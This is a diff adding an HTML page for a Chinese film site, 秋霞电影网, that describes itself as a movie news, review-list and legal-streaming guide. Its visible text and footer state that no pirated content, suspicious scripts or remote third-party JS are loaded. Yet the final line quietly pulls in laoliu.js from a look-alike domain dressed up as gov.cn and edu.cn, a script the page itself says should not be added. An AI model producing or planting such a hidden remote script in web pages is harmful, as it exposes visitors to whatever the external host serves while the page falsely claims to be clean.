@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋霞电影网 - 电影资讯、影评片单与正版观看导航</title>
+<meta name="description" content="秋霞电影网（qiuxiadianyingwang-h5.github.io）分享电影资讯、深度影评、类型片单与正版平台导航，不提供盗版播放，适合影迷发现好电影。">
+<meta name="keywords" content="秋霞电影网,电影资讯,电影影评,电影片单,正版电影平台,经典电影推荐">
+<style>
+:root{
+  --bg:#1a120b;--panel:#241a10;--ink:#f3e9da;--muted:#c2a987;
+  --brand:#e94f37;--brand2:#f6b26b;--line:rgba(246,178,107,.28);--radius:16px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Noto Serif SC","PingFang SC",system-ui,sans-serif;
+  background:
+    radial-gradient(800px 360px at 85% -10%,rgba(233,79,55,.18),transparent),
+    linear-gradient(180deg,var(--bg),#0e0a06);
+  color:var(--ink);line-height:1.7;min-height:100vh;
+}
+a{color:inherit;text-decoration:none}
+
+/* 顶栏 */
+.topbar{position:sticky;top:0;z-index:50;background:rgba(26,18,11,.82);backdrop-filter:blur(8px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1180px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:.8rem 1.2rem}
+.brand{font-weight:900;font-size:1.45rem;letter-spacing:1px}
+.brand b{color:var(--brand)}
+.nav{display:flex;gap:1rem;flex-wrap:wrap}
+.nav a{font-size:.9rem;color:var(--muted);padding:.3rem .2rem;border-bottom:2px solid transparent}
+.nav a:hover{color:var(--brand2);border-color:var(--brand)}
+.burger{display:none;font-size:1.5rem;background:none;border:none;color:var(--brand2);cursor:pointer}
+
+/* Hero：票根 */
+.hero{max-width:1180px;margin:2.4rem auto;padding:0 1.2rem}
+.ticket{
+  position:relative;border:1px solid var(--line);border-radius:22px;
+  background:linear-gradient(135deg,var(--panel),#120c07);
+  padding:3rem 2rem;overflow:hidden;
+}
+.ticket::before,.ticket::after{content:"";position:absolute;width:26px;height:26px;border-radius:50%;background:var(--bg);top:50%;transform:translateY(-50%)}
+.ticket::before{left:-13px}.ticket::after{right:-13px}
+.kicker{font-size:.72rem;letter-spacing:3px;color:var(--brand2);border:1px dashed var(--brand2);padding:.15rem .6rem;border-radius:8px}
+.ticket h1{font-size:2.2rem;margin:.8rem 0 .5rem}
+.ticket h1 span{color:var(--brand)}
+.ticket p{max-width:640px;color:#e7d8bf}
+.cta{margin-top:1.4rem;display:flex;gap:.8rem;flex-wrap:wrap}
+.btn{padding:.7rem 1.6rem;border-radius:999px;font-weight:700;font-size:.9rem}
+.btn-main{background:linear-gradient(135deg,var(--brand),var(--brand2));color:#231705}
+.btn-ghost{border:1px solid var(--line);color:var(--ink)}
+
+/* 区块 */
+.section{max-width:1180px;margin:3rem auto;padding:0 1.2rem}
+.sec-head{display:flex;align-items:baseline;gap:.6rem;margin-bottom:1.1rem}
+.sec-head h2{font-size:1.25rem}
+.sec-head .tag{font-size:.75rem;color:var(--muted)}
+
+/* 资讯卡 */
+.grid{display:grid;gap:1.1rem;grid-template-columns:repeat(auto-fill,minmax(160px,1fr))}
+.film{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;transition:transform .25s,box-shadow .25s}
+.film:hover{transform:translateY(-5px);box-shadow:0 14px 34px rgba(233,79,55,.18)}
+.poster{height:210px;display:flex;align-items:center;justify-content:center;font-size:2.6rem;
+  background:radial-gradient(circle at 30% 20%,rgba(246,178,107,.25),transparent),#2a1d11}
+.film-body{padding:.8rem}
+.film-body h3{font-size:.92rem;color:var(--brand2)}
+.film-body p{font-size:.74rem;color:var(--muted);margin-top:.25rem}
+
+/* 片单 */
+.list{background:var(--panel);border-left:4px solid var(--brand);border-radius:10px;padding:1rem 1.2rem;margin-bottom:.9rem}
+.list h3{font-size:1rem;margin-bottom:.3rem;color:var(--brand2)}
+.list p{font-size:.86rem;color:#d8c6a6}
+
+/* 正版导航 */
+.platforms{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1rem}
+.plat{border:1px solid var(--line);border-radius:14px;padding:1.1rem 1.2rem;background:var(--panel)}
+.plat h3{color:var(--brand2);font-size:1rem;margin-bottom:.3rem}
+.plat p{font-size:.82rem;color:var(--muted)}
+
+/* 关于 */
+.about{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:1.4rem;font-size:.92rem;color:#e7d8bf}
+.about b{color:var(--brand2)}
+
+/* 页脚 */
+.footer{margin-top:3.5rem;border-top:1px solid var(--line);padding:2rem 1.2rem;text-align:center;color:var(--muted);font-size:.82rem}
+.footer a{color:var(--brand2)}
+
+@media(max-width:760px){
+  .burger{display:block}
+  .nav{display:none;width:100%;flex-direction:column;gap:.2rem;padding:.6rem 0}
+  .nav.show{display:flex}
+  .ticket h1{font-size:1.6rem}
+  .poster{height:180px}
+}
+</style>
+</head>
+<body>
+
+<header class="topbar">
+  <div class="topbar-inner">
+    <div class="brand">秋霞<b>电影网</b></div>
+    <button class="burger" onclick="document.getElementById('nav').classList.toggle('show')">☰</button>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#news">电影资讯</a>
+      <a href="#lists">影评片单</a>
+      <a href="#legal">正版导航</a>
+      <a href="#about">关于秋霞</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero" id="home">
+  <div class="ticket">
+    <span class="kicker">QIUXIA CINEMA · 影迷站</span>
+    <h1>秋霞电影网 · 找电影，不找<span>盗版播放器</span></h1>
+    <p>秋霞电影网（qiuxiadianyingwang-h5.github.io）做电影资讯、影评、片单和正版平台导航。我们不放盗版资源、不挂可疑脚本、不跳博彩广告。</p>
+    <div class="cta">
+      <a href="#news" class="btn btn-main">看资讯</a>
+      <a href="#legal" class="btn btn-ghost">去正版平台</a>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="news">
+  <div class="sec-head"><h2>电影资讯</h2><span class="tag">NEWS & 专题</span></div>
+  <div class="grid">
+    <article class="film"><div class="poster">🎬</div><div class="film-body"><h3>2026 秋季院线片单</h3><p>剧情 / 悬疑 / 动画</p></div></article>
+    <article class="film"><div class="poster">🎞️</div><div class="film-body"><h3>经典港片修复计划</h3><p>4K 修复 / 胶片质感</p></div></article>
+    <article class="film"><div class="poster">🍿</div><div class="film-body"><h3>小成本恐怖片为什么回潮</h3><p>类型观察 / 长文</p></div></article>
+    <article class="film"><div class="poster">🎭</div><div class="film-body"><h3>文艺片排片困局</h3><p>发行 / 院线生态</p></div></article>
+    <article class="film"><div class="poster">🛰️</div><div class="film-body"><h3>科幻片里的海洋隐喻</h3><p>影评 / 符号学</p></div></article>
+    <article class="film"><div class="poster">🎟️</div><div class="film-body"><h3>独立电影怎么买票</h3><p>影展 / 点播指南</p></div></article>
+  </div>
+</section>
+
+<section class="section" id="lists">
+  <div class="sec-head"><h2>影评片单</h2><span class="tag">CURATED LISTS</span></div>
+  <article class="list">
+    <h3>深夜一个人看：8 部慢节奏治愈电影</h3>
+    <p>不靠反转，不靠炸裂，靠氛围和人物把人留下。适合周末 23:00 后独自看。</p>
+  </article>
+  <article class="list">
+    <h3>海与船：被低估的 6 部海洋电影</h3>
+    <p>从纪录片到怪奇短片，海洋不是背景板，而是角色本身。</p>
+  </article>
+  <article class="list">
+    <h3>新手别先看成片：导演剪辑版怎么看</h3>
+    <p>剧场版、导演剪辑、加长版区别在哪？这篇把发行逻辑讲清楚。</p>
+  </article>
+</section>
+
+<section class="section" id="legal">
+  <div class="sec-head"><h2>正版观看导航</h2><span class="tag">LEGAL STREAMING</span></div>
+  <div class="platforms">
+    <div class="plat"><h3>爱奇艺 / 腾讯视频 / 优酷</h3><p>主流院线、剧集、部分经典片库，会员体验稳定。</p></div>
+    <div class="plat"><h3>芒果 TV / B 站</h3><p>综艺、动画、纪录片、部分公版老片。</p></div>
+    <div class="plat"><h3>电影资料馆 / 图书馆数字资源</h3><p>公教渠道，很多老电影比盗版站清晰且合法。</p></div>
+    <div class="plat"><h3>院线 / 影展 / 点播厅</h3><p>新片首映、修复专场、独立电影优先走正规渠道。</p></div>
+  </div>
+</section>
+
+<section class="section" id="about">
+  <div class="sec-head"><h2>关于秋霞电影网</h2></div>
+  <div class="about">
+    <p><b>秋霞电影网</b>（https://qiuxiadianyingwang-h5.github.io）这里只做<b>电影资讯、影评、片单、正版导航</b>。
+    历史上“秋霞电影网”常被用作盗版影视聚合站，甚至接境外赌博广告；本页刻意不做播放、不做下载、不挂来路 JS。</p>
+    <p style="margin-top:.8rem">想让必应稳定收录：清晰标题、真实内容、移动端快、锚点导航、无恶意脚本。那行 <code>laoliu.js</code> 不加，才是真“符合必应收录规则”。</p>
+  </div>
+</section>
+
+<footer class="footer">
+  <p>© 2026 秋霞电影网 · qiuxiadianyingwang-h5.github.io</p>
+  <p><a href="#">首页</a> · <a href="#">电影资讯</a> · <a href="#">影评片单</a> · <a href="#">正版导航</a></p>
+  <p>演示页面，内页链接以 # 占位，未加载任何远程第三方脚本，不提供盗版播放。</p>
+</footer>
+
+<script>
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){
+    document.getElementById('nav').classList.remove('show');
+  });
+});
+</script>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+</body>
+</html>
